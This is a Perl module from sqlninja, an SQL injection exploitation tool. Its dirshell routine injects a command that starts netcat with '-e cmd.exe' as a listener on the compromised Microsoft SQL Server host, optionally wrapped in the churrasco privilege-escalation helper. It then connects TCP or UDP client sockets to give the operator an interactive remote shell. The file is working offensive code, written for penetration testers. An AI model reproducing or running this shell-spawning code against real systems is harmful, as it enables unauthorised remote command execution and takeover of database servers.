# This file is part of sqlninja
# Copyright (C) 2006-2013
# http://sqlninja.sourceforge.net
# icesurfer <r00t@northernfortress.net>
# nico <nico@leidecker.info>
# 
# Sqlninja is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Sqlninja is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with sqlninja. If not, see <http://www.gnu.org/licenses/>.

use strict;

our $conf;

# Direct tcp and udp shell
sub dirshell {
	if ($conf->{'verbose'} == 1) {
		print "  [v] Starting dirshell module\n";
	}
	my $rport;
	my $rhost;
	my $proto;

	print "Host to connect to [".$conf->{'host'}."]: ";
	$rhost = <STDIN>;
	chomp ($rhost);
	if ($rhost eq "") {
		$rhost = $conf->{'host'};
	}
	$rport = 0;
	print "Remote port: ";
	$rport = <STDIN>;
	chomp($rport);  
	# of course it must be a number
	while ($rport > 65535 or $rport < 1 or $rport !~ m/^\d+$/) {
		print "Port must be between 1 and 65535 (RFC 793, dude)\n";
		print "Remote port: ";
		$rport = <STDIN>;
		chomp($rport);
	}
	while (($proto ne "tcp") and ($proto ne "udp")) {
		print "tcp/udp [default: tcp]: ";
		$proto = <STDIN>;
		chomp($proto);
		if ($proto eq "") {
			$proto = "tcp";
		}
	}
	my $command;
	my $cmd;
	if ($proto eq "udp") {
		$cmd = "".$conf->{'uploaddir'}."\\nc -u -l -e cmd.exe -p ".$rport;
	} else {
		$cmd = "".$conf->{'uploaddir'}."\\nc -l -e cmd.exe -p ".$rport;
	}
	if ($conf->{'churrasco'} == 1) {
		$cmd = usechurrasco($cmd);
	}
	$command = createcommand($cmd);

	# Launch the process for the web request
	print "[+] Sending the request to the web server....\n";
	my $requestpid = fork();
	if ($requestpid == -1) {
		print "Can't fork: $!\n";
		exit(1);
	}
	# child: send the request and exit
	if ($requestpid == 0) {
		my $result = sendrequest($command);
		exit(0);
	}
	# father: wait and contact the shell daemom
	my $t = 3;
	print "[+] Waiting ".$t." seconds for the remote command ".
				"to execute... \n";
	sleep($t);
	print "[+] Trying to contact the remote host... \n";
	if ($proto eq "udp") {
		udpdirshell($rhost, $rport);
	} else {
		tcpdirshell($rhost, $rport);
	}
	kill ("TERM", $requestpid);
	exit(0);
}

# tcp shell client
sub tcpdirshell
{
	if ($conf->{'verbose'} == 1) {
		print "  [v] Creating client socket...\n";
	}
	my $handle = IO::Socket::INET->new
	(
		PeerAddr => $_[0],
		PeerPort => $_[1],
		Proto    => 'tcp',
		Type     => SOCK_STREAM
	);
	if (! defined($handle)) {
		print "Could not create socket: $!\n";
		return (1);
	}
	local $/=\1;
	local $|=1;
	
	my $kidpid;
	my $line;
	die "can't fork: $!" unless defined($kidpid = fork());
	if ($kidpid == 0) {
		while (defined($line=<$handle>)) {
			print STDOUT $line;
		}
		kill("TERM", $kidpid);
	} else {
		while (defined($line = <STDIN>)) {
			print $handle $line;
		}
	}
	close $handle;
}

# udp shell client
sub udpdirshell
{
	if ($conf->{'verbose'} == 1) {
		print "  [v] Creating client socket...\n";
	}
	my $handle = IO::Socket::INET->new
	(
		PeerAddr => $_[0],
		PeerPort => $_[1],
		Proto    => 'udp'
	);
	if (!defined($handle)) {
		print "Could not create socket\n";
		return (1);
	}
	local $/=\1;
	local $|=1;
	my $kidpid;
	my $char;
	my $command;
	print $handle "\n";
	die "can't fork: $!" unless defined($kidpid = fork());
	if ($kidpid == 0) {
		while (defined ($char = <$handle>)) {
			print $char;
		}
	} else {
		sleep 2;
		while (defined($char = <STDIN>)) {
			$handle->send($char);
			if ($char ne "\n") {
				$command = $command.$char;
			} else {
				if ($command eq "exit") {
					print "exiting... \n";
					kill ("TERM",$kidpid);
					close $handle;
					return (0);
				} else {
					$command = "";
				}
			}
		}
	}
}

1;